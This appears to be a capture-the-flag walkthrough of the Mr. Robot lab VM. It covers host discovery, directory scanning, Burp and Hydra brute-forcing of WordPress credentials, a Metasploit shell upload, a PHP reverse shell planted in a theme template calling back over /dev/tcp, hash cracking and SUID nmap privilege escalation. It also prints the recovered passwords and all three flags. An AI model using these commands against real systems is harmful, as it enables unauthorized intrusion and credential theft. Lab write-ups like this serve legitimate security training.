```
sudo netdiscover -r 192.168.0.1/24
```
Result:

Currently scanning: Finished!   |   Screen View: Unique Hosts                                         

4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 192.168.0.2     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 192.168.0.3     08:00:27:12:71:25      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
==192.168.0.6     08:00:27:3e:b3:75      1      60  PCS Systemtechnik GmbH ==

Let's perform a NMAP aggressive scan,
```
 sudo nmap -A 192.168.0.6 
```

Result:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 09:53 EDT
Nmap scan report for 192.168.0.6
Host is up (0.00043s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
==443/tcp open   ssl/http Apache httpd==
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:3E:B3:75 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.9 (94%), Linux 3.2 - 3.8 (93%), Linux 3.18 (92%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 2.6.26 - 2.6.35 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 192.168.0.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds

It looks like web page is running in apche server on 'port number 443'.
Lets see the web page on  the browser.
Lets scan the web page,
There are many tools that are avaliable to perform the scan,here i am going to use is ==Dirb==.
**Dirb**:
Dirb is an online directory scanner that searches web servers for hidden files, directories, and pages. 
Lets start the Scan:
```bash
sudo dirb http://192.168.0.6/
```
It will scan the whole dirtecso it take some time.
 

<img src="./img/Screenshot 2024-08-11 195801.png"></img>

once its finished its scan. There is a directory in the name of **robot.txt**
check that in the browser.
like this:
```
http://192.168.0.6/robots.txt
```
this directory has some login creditionals with username word list and the directory which has the first flag<img src="./img/Screenshot 2024-08-11 194556 1.png"></img>
Download the fsocity.dic document. Because it contains the username list.
```
http://192.168.0.6/fsocity.dic
```
first flag
<img src="./img/Screenshot 2024-08-11 194613.png"></img>
```
key-1-of-3.text
073403c8a58a1f80d943455fb30724b9
```
 According to the scan we have Word press login page.
 Lets look into that.
 My first try to login creditionals is 
 <img src="./img/Screenshot 2024-08-11 195246.png"></img>
 ```
 username:admin
 password: admin
```
But it is wrong.
Lets bruteforce it using the wordlist we got "fsociety.dic" by using ==Burpsuite==
Now open this site in Burpsuite browser.
```
http://192.168.0.6/wp-login.php
```

Follow the steps to perform the Bruteforce attack for the username,

1.Go to **Proxy**
2.Enter some sample login creditonals
```
username:test
password:test
```
3.turn on the interceptor and the try login in
4.now we catched the entering packets.And it will look like this.

POST /wp-login.php HTTP/1.1

Host: 192.168.0.6

Content-Length: 98

Cache-Control: max-age=0

Accept-Language: en-US

Upgrade-Insecure-Requests: 1

Origin: http://192.168.0.6

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.0.6/wp-login.php

Accept-Encoding: gzip, deflate, br

Cookie: wordpress_test_cookie=WP+Cookie+check

Connection: keep-alive



**log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.6%2Fwp-admin%2F&testcookie=1**

5.Now select from log to pwd=test then click it to send 'to the intruder'
6.now select the test from the log field and add it as a variable.
7.Go to payloads settings select the load field.
8.Add the username list which we got it as "fsocity.dic"
9.start the attack
<img src="./img/Screenshot 2024-08-11 202802.png"></img>
<img src="./img/Screenshot 2024-08-11 202822.png"></img>

Now we got length for username
But we similar length for all username except the the **Elliot**
Now we found the username .

Lets find the password for the elliot username
first we have to sort the fsocity.dic file by using follwing command.
```
sort /home/kali/Downloads/fosocity.dic| uniq >elliotpw.txt
```
now we have unique words in this file compared to fsocity.dic
Lets perform brute force attack for password
here i will use the tool called **Hydra**
```
sudo hydra -vV -l elliot -P elliot_password.txt 192.168.0.6 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is Incorect'

```
Result:
<img src="./img/Pasted image 20240811211822.png"></img>
 we found 16 vaild password
 Now we have perform **Wpscan** to get correct combination.
 ```
 wpscan --url 192.168.0.6 --passwords elliot_password.txt --usernames Elliot  
```
And we got it
<img src="./img/Pasted image 20240811212115.png"></img>
Now the combination are:
```
username:Elliot
password:ER28-0652
```
```
http://192.168.0.6/wp-login.php
http://192.168.0.6/key-1-of-3.txt
192.168.0.6/fsocity.dic
```
Now login into Wordpress using creditionals
Let now open a reverse shell.
Simple method to open a shell  using metasploit.
1.open msfconsole
2.search for wordpress shell
follow the cmds
```
msfconsole
search wordpress shell
use exploit/unix/webapp/wp_admin_shell_upload
set RHOST target ip address
set USERNAME Elliot
set PASSWORD ER28-0652
set WPCHECK False
run
```
We got the meterpreter shell open now
now open a session by typing the cmd.
```
shell
```
And open sh shell by using cmd.
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Now we search a key inside the machine using shell.

**Another method by using Php script**
Go to Apperance->Editor-> 404 template
paste the below reverse php Script.
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/"local machine ip address"/443 0>&1'");
?>
```
Update the file
Now setup the listener using netcat
```
sudo nc -lvp 443
```
<img src="./img/Screenshot 2024-08-24 121743 1.png"></img>
now
search a non existing directory that gives you 404 error.
```
http://192.168.0.6/ddxf
```
Successfully got reverse shell in our terminal
Lets look for other details
Just perform some basic cmds like
```
ls
cat wp-config.php
```
We can see the configuration of the database for the mr.robot we got many passwords and user
```
ls -la /home
```
We got a robot directory
look into that
```
ls -la /home/robot
```
we got a key file and  password.raw.md5 file and the key file only accessed by robot user, 
cat password file.
```
cat /home/robot/password.raw-md5
```

we got <img src="./img/Screenshot 2024-08-24 122456.png"></img>a hash string
Put that hash string into the https://crackstation.net/
<img src="./img/Screenshot 2024-08-24 122540.png"></img>
we got a robot user password
```
abcdefghijklmnopqrstuvwxyz
```

Now if we put "su robot" it will throw a error because it needs pty terminal
import that terminal.
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
su robot
password: abcdefghijklmnopqrstuvwxyz
```
now open key file
```
cat /home/robot/key-2-of-3.txt
```
```
key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
We got second key successfully.
Get into the root
```
find / -perm -4000 -type f 2>/tmp/2
```
searched got a command to get the root shell from gtfobins

(https://gtfobins.github.io/gtfobins/nmap/#suid%5C)
<img src="./img/Screenshot 2024-08-24 125339.png"></img>
Look for nmap
```
nmap --interactive
```

```
!sh
```
<img src="./img/Screenshot 2024-08-24 130348.png"></img>
we got the root
change into root directory
```
cd /root
ls
cat key-3-of-3.txt
```
<img src="./img/Screenshot 2024-08-24 130404.png"></img>
<img src="./img/Screenshot 2024-08-24 130828.png"></img>```
key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

```

All three keys are found.
